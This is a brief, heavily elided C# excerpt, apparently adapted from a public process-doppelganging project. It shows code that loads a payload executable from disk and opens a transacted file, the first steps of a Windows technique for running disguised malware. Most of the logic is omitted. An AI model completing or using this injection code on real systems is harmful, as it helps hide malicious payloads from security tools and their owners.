...
// original code - https://github.com/pinnace/dotnet-process-doppelganging

namespace Process_Doppelganging
{
    ...
    internal class Program
    {
        ...
        public static unsafe void Main(string[] args)
        {
            ...
            byte[] Payload = File.ReadAllBytes(@"C:\Users\user\Downloads\m3t.exe");
            ...
            IntPtr hTransactedFile = CreateFileTransacted(@"C:\Users\user\Desktop\yolo.txt", 0xC0000000, 0, IntPtr.Zero, 2, 0x80, IntPtr.Zero, hTransaction, IntPtr.Zero, IntPtr.Zero);
            ...
            IntPtr uTargetPath = CreateUnicodeStruct("C:\\Users\\user\\Desktop");
